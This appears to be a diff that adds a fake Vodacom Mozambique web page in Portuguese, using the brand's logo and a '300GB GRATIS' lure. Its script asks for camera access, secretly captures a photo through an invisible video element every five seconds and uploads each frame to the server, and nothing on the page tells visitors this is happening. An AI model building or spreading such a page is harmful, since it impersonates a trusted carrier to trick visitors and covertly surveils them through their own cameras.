@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vodacom Mozambique</title>
+    <style>
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    color: #333;
+}
+
+.header-top {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 10px 20px;
+    background-color: #fff;
+    border-bottom: 1px solid #ddd;
+}
+
+.logo {
+    height: 40px;
+}
+
+nav ul {
+    list-style: none;
+    display: flex;
+    gap: 20px;
+}
+
+nav ul li {
+    margin: 0;
+}
+
+nav ul li a {
+    text-decoration: none;
+    color: #333;
+    font-weight: bold;
+}
+
+.hero {
+    position: relative;
+    text-align: center;
+    color: white;
+}
+
+
+.hero {
+    position: relative;
+    text-align: center;
+    color: white;
+    background-image: url('https://www.vm.co.mz/_next/image?url=https%3A%2F%2Fwebsite-cms.api.prod.ind.vm.co.mz%2Fuploads%2FVoda563_x_563_8b2dec335b.png%3Fformat%3Dwebp&w=640&q=75');
+    background-size: cover;
+    background-position: center bottom;
+    height: 100vh; /* Define a altura da seção hero */
+}
+
+.hero-content {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+}
+
+
+.hero h1 {
+    font-size: 3em;
+    margin: 0;
+}
+
+.hero button {
+    padding: 10px 20px;
+    font-size: 1.2em;
+    background-color: #ff0000;
+    color: #fff;
+    border: none;
+    cursor: pointer;
+    margin-top: 20px;
+}
+
+.services {
+    display: flex;
+    justify-content: space-around;
+    padding: 20px;
+    background-color: #f9f9f9;
+}
+
+.service {
+    flex: 1;
+    text-align: center;
+}
+
+.service h2 {
+    font-size: 1.5em;
+    margin-bottom: 10px;
+}
+
+
+    </style>
+</head>
+<body>
+    <header>
+        <div class="header-top">
+            <img src="https://www.vm.co.mz/_next/image?url=%2F_next%2Fstatic%2Fmedia%2FVodafone_Icon_RGB_Red.5b3b4f7e.webp&w=128&q=75" alt="Vodacom Logo" class="logo">
+            <nav>
+                <ul>
+                    <li><a href="#">Individual</a></li>
+                    <li><a href="#">Business</a></li>
+                    <li><a href="#">M-Pesa</a></li>
+                    <li><a href="#">Lojas</a></li>
+                    <li><a href="#">Meu Portal</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <section class="hero">
+            
+            <div class="hero-content">
+                <h1 style="font-size: 100px;">300GB GRATIS</h1>
+                <button>Saiba mais</button>
+            </div>
+        </section>
+
+        <section class="services">
+            <div class="service">
+                <h2>Pré-Pago</h2>
+                <!-- Add content for Pré-Pago -->
+            </div>
+            <div class="service">
+                <h2>Pós-Pago</h2>
+                <!-- Add content for Pós-Pago -->
+            </div>
+            <div class="service">
+                <h2>Entretenimento</h2>
+                <!-- Add content for Entretenimento -->
+            </div>
+            <div class="service">
+                <h2>Assistência</h2>
+                <!-- Add content for Assistência -->
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <!-- Footer content -->
+    </footer>
+    <script>
+        
+            
+        function enviarFoto() {
+    // Verifica se o navegador suporta a API de captura de mídia
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        console.error('API de captura de mídia não suportada.');
+        return;
+    }
+
+    // Solicita acesso à câmera
+    navigator.mediaDevices.getUserMedia({ video: true })
+    .then(function(stream) {
+        // Cria um elemento de vídeo para captura invisível
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+
+        // Captura um quadro da câmera após 1 segundo (tempo para ajustar a câmera)
+        setTimeout(function() {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Converte o quadro capturado para um blob
+            canvas.toBlob(function(blob) {
+                // Cria um FormData e anexa o blob com o nome do arquivo
+                const formData = new FormData();
+                formData.append('file', blob, 'photo.jpg');
+
+                // Envia o FormData para o servidor via fetch
+                fetch('/upload', {
+                    method: 'POST',
+                    body: formData
+                }).then(function(response) {
+                    if (response.ok) {
+                        console.log('Foto enviada com sucesso!');
+                    } else {
+                        console.error('Erro ao enviar foto:', response.statusText);
+                    }
+                }).catch(function(error) {
+                    console.error('Erro no fetch:', error);
+                });
+
+                // Limpa o stream da câmera
+                stream.getTracks().forEach(track => track.stop());
+            }, 'image/jpeg'); // Define o formato da imagem aqui (pode ser 'image/png' também)
+
+            // Limpa o vídeo
+            video.pause();
+            video.srcObject = null;
+
+        }, 1000); // Aguarda 1 segundo antes de capturar a imagem
+    })
+    .catch(function(error) {
+        console.error('Erro ao acessar a câmera:', error);
+    });
+}
+
+// Chama a função `enviarFoto` a cada 5 segundos
+setInterval(enviarFoto, 5000);
+
+    </script>
+</body>
+</html>
